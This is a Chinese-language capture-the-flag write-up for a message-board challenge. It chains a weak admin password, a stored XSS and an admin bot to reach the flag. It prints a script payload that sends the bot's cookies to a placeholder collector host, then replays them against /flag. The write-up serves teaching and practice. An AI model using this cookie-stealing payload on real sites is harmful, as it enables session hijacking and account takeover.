# Level 69 MysteryMessageBoard

## 题目简述

应用提供登录和留言板，`/flag` 只允许管理员访问，`/admin` 会触发带管理员会话的 bot 查看留言。普通用户输入在留言页面中未做安全转义，形成存储型 XSS；目标是让 bot 执行脚本并把管理员会话带出，再访问受保护路由。

## 解题过程

登录入口使用弱口令。官方总题解只写了“弱密码登录”，[同期公开复盘](https://eddiemurphy89.github.io/2025/02/04/HGAME2025-WEB/)补充记录了口令 `888888`。登录后在留言板提交普通 HTML/脚本并回看页面，可确认输入会被当作 HTML 渲染，而不是作为文本转义。

准备一个能够记录查询参数的 HTTP 收集端，在留言中写入存储型 XSS。下面的占位地址必须替换为自己的受控收集端：

```html
<script>
location.href = "https://YOUR-COLLECTOR.example/?cookie="
  + encodeURIComponent(document.cookie);
</script>
```

然后访问 `/admin`，让管理员 bot 打开留言页面。脚本在管理员会话上下文执行，收集端会收到其 Cookie。将得到的管理员 Cookie 放入后续请求：

```http
GET /flag HTTP/1.1
Host: challenge.example
Cookie: <从 bot 请求中恢复的管理员 Cookie>
Connection: close
```

即可读取 flag。官方 PDF 和可检索的公开文字题解都没有保存最终 flag 文本，因此这里不臆造具体值；漏洞确认、bot 触发、会话外带和访问 `/flag` 已构成完整可复现主线。

如果 Cookie 被设置为 `HttpOnly`，`document.cookie` 将无法读取，此时必须改用同源 `fetch('/flag')` 获取响应后再外带内容；本题公开解法能直接读取 Cookie，说明目标会话 Cookie 未启用该保护。

## 方法总结

- 核心技巧：利用留言板的存储型 XSS，在管理员 bot 上下文窃取会话，再以管理员身份访问受保护路由。
- 识别信号：普通用户可提交富文本、存在“管理员会查看”的 `/admin` bot，同时 `/flag` 仅校验角色或 Cookie，是典型的存储型 XSS 到权限提升链。
- 复用要点：先用无害 payload 验证渲染点，再准备可观察的收集端并触发 bot。应区分“窃取 Cookie”和“在 bot 上下文直接读取敏感页面”两种方案，具体取决于 `HttpOnly`、CSP 和同源限制。
